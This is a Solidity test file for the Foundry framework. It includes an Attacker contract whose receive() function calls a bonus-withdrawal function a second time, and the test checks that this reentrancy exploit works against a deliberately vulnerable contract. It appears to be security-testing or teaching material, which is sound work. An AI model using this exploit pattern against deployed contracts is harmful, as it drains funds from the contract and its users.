
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdstorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    using stdstorage for StdStorage;
    
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max);

        uint256 contractBalance = attackVal * 2;
        vm.deal(address(_contractUnderTest), contractBalance);

        uint256 initialAttackerBalance = address(_attacker).balance;
        
        _attacker.attack();

        uint256 finalAttackerBalance = address(_attacker).balance;
        uint256 expectedBonus = 200;

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGe(finalAttackerBalance - initialAttackerBalance, expectedBonus, "Attacker did not receive expected bonus amount");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        _victim = Reentrancy_bonus(victimAddress);
    }

    function attack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        initialSnapshot = address(this).balance;
        
        _victim.getFirstWithdrawalBonus(address(this));

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount == 0) {
            attackCallCount++;
            _victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
